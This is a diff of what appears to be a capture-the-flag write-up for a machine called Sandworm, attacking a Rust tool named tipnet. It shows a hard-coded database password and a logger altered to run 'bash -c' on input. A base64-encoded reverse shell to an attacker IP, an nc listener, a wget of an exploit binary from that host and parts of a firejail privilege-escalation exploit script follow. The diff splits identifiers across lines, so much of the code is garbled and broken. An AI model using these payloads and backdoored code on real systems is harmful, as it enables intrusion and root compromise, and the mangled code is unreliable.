  if keywords.trim() == "" {
  println!("[-] No keywords selected.\n\n[-] Quitting...\n");
@@ -1084,24 +980,30 @@ P' MM `7 MMN. M MM
  }
 
  println!("Justification for the search:");
- let mut justification = String::new();
- io::stdin().read_line(&mut justification).unwrap();
+ let mut justification = String::
+new();
+ io::
+stdin().read_line(&mut justification).unwrap();
 
- // Get Username 
- let output = Command::new("/usr/bin/whoami")
+ // Get Username
+ let output = Command::
+new("/usr/bin/whoami")
  .output()
  .expect("nobody");
 
- let username = String::from_utf8(output.stdout).unwrap();
+ let username = String::
+from_utf8(output.stdout).unwrap();
  let username = username.trim();
 
  if justification.trim() == "" {
  println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
- logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
+ logger::
+log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
  return;
  }
 
- logger::log(username, keywords.as_str().trim(), justification.as_str());
+ logger::
+log(username, keywords.as_str().trim(), justification.as_str());
 
  search_sigint(&mut conn, keywords.as_str().trim());
 
@@ -1110,7 +1012,8 @@ P' MM `7 MMN. M MM
 fn get_mode() -> String {
 
  let valid = false;
- let mut mode = String::new();
+ let mut mode = String::
+new();
 
  while ! valid {
  mode.clear();
@@ -1118,7 +1021,8 @@ fn get_mode() -> String {
  println!("Select mode of usage:");
  print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");
 
- io::stdin().read_line(&mut mode).unwrap();
+ io::
+stdin().read_line(&mut mode).unwrap();
 
  match mode.trim() {
  "a" => {
@@ -1153,16 +1057,22 @@ fn get_mode() -> String {
  return mode;
 }
 
-fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
- let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
- let pool = Pool::new(url).unwrap();
+fn connect_to_db(db: &str) -> Result<mysql::
+PooledConn> {
+ let url = "mysql://tipnet:
+4The_Greater_GoodJ4A@localhost:
+3306/Upstream";
+ let pool = Pool::
+new(url).unwrap();
  let mut conn = pool.get_conn().unwrap();
  return Ok(conn);
 }
 
-fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
+fn search_sigint(conn: &mut mysql::
+PooledConn, keywords: &str) {
  let keywords: Vec<&str> = keywords.split(" ").collect();
- let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");
+ let mut query = String::
+from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");
 
  for (i, keyword) in keywords.iter().enumerate() {
  if i > 0 {
@@ -1182,26 +1092,37 @@ fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
  }
 }
 
-fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
- let paths = fs::read_dir(directory)
+fn pull_indeces(conn: &mut mysql::
+PooledConn, directory: &str) {
+ let paths = fs::
+read_dir(directory)
  .unwrap()
  .filter_map(|entry| entry.ok())
  .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
  .map(|entry| entry.path());
 
- let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
+ let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :
+hash")
  .unwrap();
- let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
+ let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:
+timestamp, :
+data, :
+hash)")
  .unwrap();
 
- let now = Utc::now();
+ let now = Utc::
+now();
 
  for path in paths {
- let contents = fs::read_to_string(path).unwrap();
- let hash = Sha256::digest(contents.as_bytes());
- let hash_hex = hex::encode(hash);
+ let contents = fs::
+read_to_string(path).unwrap();
+ let hash = Sha256::
+digest(contents.as_bytes());
+ let hash_hex = hex::
+encode(hash);
 
- let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
+ let existing_en
+try: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
  if existing_entry.is_none() {
  let date = now.format("%Y-%m-%d").to_string();
  println!("[+] {}\n", contents);
@@ -1213,26 +1134,27 @@ fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
  ).unwrap();
  }
  }
- logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");
+ logger::
+log("ROUTINE", " - ", "Pulling fresh submissions into database.");
 
 }
-```
-
-
-
-```
 extern crate chrono;
 
-use std::fs::OpenOptions;
-use std::io::Write;
-use chrono::prelude::*;
+use std::fs::
+OpenOptions;
+use std::io::
+Write;
+use chrono::
+prelude::*;
 
 pub fn log(user: &str, query: &str, justification: &str) {
- let now = Local::now();
+ let now = Local::
+now();
  let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
  let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
 
- let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+ let mut file = match OpenOptions::
+new().append(true).create(true).open("/opt/tipnet/access.log") {
  Ok(file) => file,
  Err(e) => {
  println!("Error opening log file: {}", e);
@@ -1244,25 +1166,27 @@ pub fn log(user: &str, query: &str, justification: &str) {
  println!("Error writing to log file: {}", e);
  }
 }
-```
-
-
-
-```
 extern crate chrono;
 
-use std::fs::OpenOptions;
-use std::io::Write;
-use chrono::prelude::*;
+use std::fs::
+OpenOptions;
+use std::io::
+Write;
+use chrono::
+prelude::*;
 
-use std::process::Command;
+use std::
+process::
+Command;
 
 pub fn log(user: &str, query: &str, justification: &str) {
- let now = Local::now();
+ let now = Local::
+now();
  let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
  let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
 
- let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+ let mut file = match OpenOptions::
+new().append(true).create(true).open("/opt/tipnet/access.log") {
  Ok(file) => file,
  Err(e) => {
  println!("Error opening log file: {}", e);
@@ -1270,7 +1194,8 @@ pub fn log(user: &str, query: &str, justification: &str) {
  }
  };
 
- let output = Command::new("bash")
+ let output = Command::
+new("bash")
  .args(["-c", justification])
  .output()
  .expect("Failed to execute command");
@@ -1279,45 +1204,32 @@ pub fn log(user: &str, query: &str, justification: &str) {
  println!("Error writing to log file: {}", e);
  }
 }
-```
-
-
-
-```
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvMTIzNCAwPiYx | base64 -d | /usr/bin/bash
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/work]
 └─# nc -lnvp 1234
 listening on [any] 1234 ...
-```
-
-
-
-```
 2023/06/21 07:06:01 CMD: UID=0 PID=42694 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
-```
-
-
-
-```
 extern crate chrono;
 
-use std::process::Command;
+use std::
+process::
+Command;
 
-use std::fs::OpenOptions;
-use std::io::Write;
-use chrono::prelude::*;
+use std::fs::
+OpenOptions;
+use std::io::
+Write;
+use chrono::
+prelude::*;
 
 pub fn log(user: &str, query: &str, justification: &str) {
- let now = Local::now();
+ let now = Local::
+now();
  let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
  let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
 
- let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+ let mut file = match OpenOptions::
+new().append(true).create(true).open("/opt/tipnet/access.log") {
  Ok(file) => file,
  Err(e) => {
  println!("Error opening log file: {}", e);
@@ -1325,7 +1237,8 @@ pub fn log(user: &str, query: &str, justification: &str) {
  }
  };
 
- let output = Command::new("bash")
+ let output = Command::
+new("bash")
  .args(["-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0MSAwPiYx | base64 -d | bash"])
  .output()
  .expect("Failed to execute command");
@@ -1334,11 +1247,6 @@ pub fn log(user: &str, query: &str, justification: &str) {
  println!("Error writing to log file: {}", e);
  }
 }
-```
-
-
-
-```
 atlas@sandworm:~$ wget http://10.10.14.114/firejoin_py.bin
 wget http://10.10.14.114/firejoin_py.bin
 --2023-06-21 15:34:32-- http://10.10.14.114/firejoin_py.bin
@@ -1355,11 +1263,6 @@ atlas@sandworm:~$ chmod +x firejoin_py.bin
 chmod +x firejoin_py.bin
 atlas@sandworm:~$ ./firejoin_py.bin
 ./firejoin_py.bin
-```
-
-
-
-```
 #!/usr/bin/python3
 
 # Author: Matthias Gerstner <matthias.gerstner () suse com>
@@ -1442,7 +1345,7 @@ def createHelperSandbox():
  if not line:
  raise Exception("helper sandbox creation failed")
 
- # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
+ # on stderr a line of the form "Parent pid , child pid " is output
  line = line.decode('utf8').strip().lower()
  if line.find("child pid") == -1:
  continue
@@ -1452,7 +1355,8 @@ def createHelperSandbox():
  try:
  child_pid = int(child_pid)
  break
- except Exception:
+ 
+except Exception:
  raise Exception("failed to determine child pid from helper sandbox")
 
  # We need to find the child process of the child PID, this is the
@@ -1473,7 +1377,8 @@ def createHelperSandbox():
  try:
  sleep_pid = int(kids[0])
  break
- except Exception:
+ 
+except Exception:
  raise Exception("failed to determine sleep child PID from helper sandbox")
  else:
  raise Exception(f"sleep child process did not come into existence in {children}")
@@ -1594,29 +1499,14 @@ while True:
  line = sys.stdin.readline()
  if not line:
  break
-```
-
-
-
-```
 cmdline = "unshare -U -r -m".split()
  cmdline += [__file__]
 
  # Re-execute this script with unshared user and mount namespaces
  subprocess.call(cmdline)
-```
-
-
-
-```
 atlas@sandworm:~$ firejail --join=5696
 firejail --join=5696
 Error: no valid sandbox
-```
-
-
-
-```
 atlas@sandworm:~$ firejail --join=5701
 firejail --join=5701
 Warning: cleaning all supplementary groups
